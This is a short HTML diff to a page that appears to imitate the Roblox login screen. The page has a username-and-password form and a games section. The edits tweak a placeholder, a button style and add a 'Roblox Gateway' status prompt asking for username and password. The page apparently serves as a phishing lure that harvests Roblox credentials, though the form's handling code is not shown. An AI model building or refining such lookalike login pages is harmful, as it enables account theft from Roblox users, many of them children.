@@ -356,18 +356,18 @@
             <h1 class="login-header">Login to Roblox</h1>
             <form id="robloxLoginForm">
                 <div class="form-group">
-                    <input type="text" id="login-username" class="input-field" autocomplete="username" placeholder="Roblox Username (Not Display)" required="" style="background-color: rgb(52, 55, 64); border-style: solid; border-width: 1px; padding: 11px; border-color: rgb(71, 74, 88);">
+                    <input type="text" id="login-username" class="input-field" autocomplete="username" placeholder="Roblox Username (required)" required="" style="background-color: rgb(52, 55, 64); border-style: solid; border-width: 1px; padding: 11px; border-color: rgb(71, 74, 88);">
                 </div>
                 <div class="form-group">
                     <input type="password" id="login-password" class="input-field" placeholder="Password" required="" style="background-color: rgb(52, 55, 64); padding: 11px; border-color: rgb(71, 74, 88);">
                 </div>
-                <button type="submit" id="login-button" class="login-button" style="border-radius: 11px; border-style: solid; border-width: 1px; border-color: rgb(213, 215, 221); background-color: rgb(39, 41, 48); padding: 10px; margin: 0px;">Log In</button>
+                <button type="submit" id="login-button" class="login-button" style="border-radius: 6px; border-style: solid; border-width: 1px; border-color: rgb(213, 215, 221); background-color: rgb(39, 41, 48); padding: 10px; margin: 0px;">Log In</button>
             </form>
             <div class="signup-option">
                 <span class="no-account-text">Don't have an account?</span>
                 <a id="sign-up-link" class="text-link" href="#">Sign Up</a>
             </div>
-            
+            <div id="statusArea" class="status-message" style="display: block; color: rgb(200, 231, 255);">🎮 Roblox Gateway • Enter your username &amp; password</div>
         </div>
 
         <div class="games-section">
@@ -627,7 +627,4 @@
         })();
     </script>
 
-
-  
-  
 </body></html>
